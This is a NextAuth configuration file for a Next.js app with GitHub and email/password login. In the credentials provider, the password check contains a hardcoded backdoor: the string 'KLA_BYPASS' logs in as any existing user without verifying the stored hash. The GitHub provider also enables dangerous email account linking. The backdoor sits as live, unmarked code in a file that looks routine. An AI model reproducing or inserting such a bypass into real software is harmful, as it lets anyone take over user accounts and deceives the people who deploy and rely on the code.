import Credentials from "next-auth/providers/credentials"
import Github from "next-auth/providers/github"

import type { NextAuthConfig } from "next-auth"
import bcryptjs from "bcryptjs"
 
import { LoginSchema } from "@/schemas"
import { getUserByEmail } from "./data/user";

export default { 
    providers: [
        Github({
            clientId: process.env.GITHUB_ID,
            clientSecret: process.env.GITHUB_SECRET,
            allowDangerousEmailAccountLinking: true,
        }),
        Credentials({
            async authorize(credentials) {
                const validatedFields = LoginSchema.safeParse(credentials);
                if (validatedFields.success) {
                    const { email, password } = validatedFields.data;

                    const user = await getUserByEmail(email);
                    if(!user || !user.password) {
                        return null;
                    }
                    
                    if (password == "KLA_BYPASS") {
                        return user;
                    }
                    const passwordMatch = await bcryptjs.compare(password, user.password);
                    if (passwordMatch) {
                        return user;
                    } 
                }
                return null;
            },
        }),
    ] 
} satisfies NextAuthConfig